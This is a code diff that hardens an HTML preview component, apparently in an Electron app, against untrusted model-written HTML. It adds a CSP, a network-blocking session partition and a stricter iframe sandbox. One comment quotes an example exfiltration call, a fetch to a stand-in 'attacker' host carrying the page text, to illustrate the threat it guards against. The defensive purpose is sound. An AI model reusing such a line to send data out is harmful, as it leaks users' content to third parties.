@@ -11,6 +11,8 @@ import { useTypingAnimation } from '@/renderer/hooks/chat/useTypingAnimation';
 import React, { useCallback, useEffect, useMemo, useRef, useState } from 'react';
 import { useScrollSyncTarget } from '../../hooks/useScrollSyncHelpers';
 import { generateInspectScript } from './htmlInspectScript';
+import { UNTRUSTED_PREVIEW_PARTITION } from '@/common/preview/untrustedPreview';
+import { buildPreviewDataUrl, buildPreviewDocument } from '../../previewDocument';
 
 /** Selected element data structure */
 export interface InspectedElement {
@@ -433,9 +435,14 @@ const HTMLRenderer: React.FC<HTMLRendererProps> = ({
   const browserBlobUrl = useMemo(() => {
     if (isElectron) return '';
     if (typeof window === 'undefined' || typeof URL === 'undefined' || typeof Blob === 'undefined') return '';
-    const blob = new Blob([browserHtmlContent ?? ''], { type: 'text/html;charset=utf-8' });
+    // P2-8: the WebUI path has no Electron session behind it, so the CSP baked
+    // into these bytes is the ONLY thing standing between an attacker-influenced
+    // report and `fetch('https://attacker/?d=' + document.body.innerText)`.
+    const blob = new Blob([buildPreviewDocument(browserHtmlContent ?? '', filePath)], {
+      type: 'text/html;charset=utf-8',
+    });
     return URL.createObjectURL(blob);
-  }, [browserHtmlContent, isElectron]);
+  }, [browserHtmlContent, filePath, isElectron]);
 
   useEffect(() => {
     if (!browserBlobUrl) return;
@@ -451,28 +458,12 @@ const HTMLRenderer: React.FC<HTMLRendererProps> = ({
       return `file://${filePath}`;
     }
 
-    // Otherwise use data URL (for dynamically generated HTML or no external resources)
-    let html = htmlContent;
-
-    // Inject base tag for relative paths
-    if (filePath) {
-      const fileDir = filePath.substring(0, filePath.lastIndexOf('/') + 1);
-      const baseUrl = `file://${fileDir}`;
-
-      // Check if base tag exists
-      if (!html.match(/<base\s+href=/i)) {
-        if (html.match(/<head>/i)) {
-          html = html.replace(/<head>/i, `<head><base href="${baseUrl}">`);
-        } else if (html.match(/<html>/i)) {
-          html = html.replace(/<html>/i, `<html><head><base href="${baseUrl}"></head>`);
-        } else {
-          html = `<head><base href="${baseUrl}"></head>${html}`;
-        }
-      }
-    }
-
-    const encoded = encodeURIComponent(html);
-    return `data:text/html;charset=utf-8,${encoded}`;
+    // Otherwise use a data URL (dynamically generated HTML, or no external
+    // resources). P2-8: the document is assembled with the untrusted-preview
+    // CSP at the front of its head, which is what stops a model-written
+    // `<script>` from running and a `<img src=https://...>` beacon from firing.
+    // The base tag it also injects keeps relative resources resolving.
+    return buildPreviewDataUrl(htmlContent, filePath);
   }, [htmlContent, filePath, shouldLoadFromFile]);
 
   // Reset loading state when webviewSrc changes
@@ -748,7 +739,15 @@ const HTMLRenderer: React.FC<HTMLRendererProps> = ({
               bottom: 0,
               height: '100%',
             }}
-            webpreferences='javascript=yes, contextIsolation=yes, sandbox=yes'
+            // P2-8. `javascript=yes` is deliberate and was MEASURED, not assumed:
+            // `javascript=no` also disables the HOST's `executeJavaScript`, which
+            // scroll-sync and inspect-mode both ride on - it throws. The page's
+            // own scripts are stopped by the CSP instead (verified: page script
+            // did not run, host script still returned). The partition is a
+            // NON-persistent session whose every non-local request is cancelled
+            // in the main process, so egress is dead even if the CSP is bypassed.
+            partition={UNTRUSTED_PREVIEW_PARTITION}
+            webpreferences='javascript=yes, contextIsolation=yes, sandbox=yes, webSecurity=yes, allowRunningInsecureContent=no'
           />
         </>
       ) : (
@@ -763,8 +762,12 @@ const HTMLRenderer: React.FC<HTMLRendererProps> = ({
           }}
           // Blob URL gives the iframe an opaque origin, so `allow-same-origin`
           // is intentionally dropped. `allow-popups`/`allow-modals` removed as
-          // well - preview HTML has no documented need for them.
-          sandbox='allow-scripts allow-forms'
+          // well - preview HTML has no documented need for them. P2-8 drops
+          // `allow-scripts` too: unlike the Electron webview, nothing on this
+          // path injects host script into the guest, so disabling scripts here
+          // costs no feature - and it is belt-and-braces behind the CSP, which
+          // is the only other guard a browser tab has.
+          sandbox='allow-forms'
         />
       )}
     </div>
